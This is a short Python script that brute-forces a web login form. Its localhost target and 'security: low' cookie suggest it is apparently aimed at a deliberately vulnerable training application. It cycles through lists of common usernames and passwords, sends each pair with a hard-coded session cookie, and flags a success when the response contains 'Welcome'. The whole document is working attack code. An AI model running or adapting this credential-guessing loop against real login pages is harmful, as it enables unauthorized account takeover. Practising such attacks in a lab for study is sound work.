import requests

target = "http://localhost/vulnerabilities/brute/"

usernames = ["admin", "user", "test", "guest"]
passwords = ["password", "123456", "admin", "letmein", "test"]

for username in usernames:
    for password in passwords:
        response = requests.get(target, params={
            "username": username,
            "password": password,
            "Login": "Login"
        }, cookies={"PHPSESSID": "q8c5cauh671aht2gdm73mkgtl5", "security": "low"})

        if "Welcome" in response.text:
            print(f"[FOUND] Username: {username} Password: {password}")
        else:
            print(f"[MISS]  Username: {username} Password: {password}")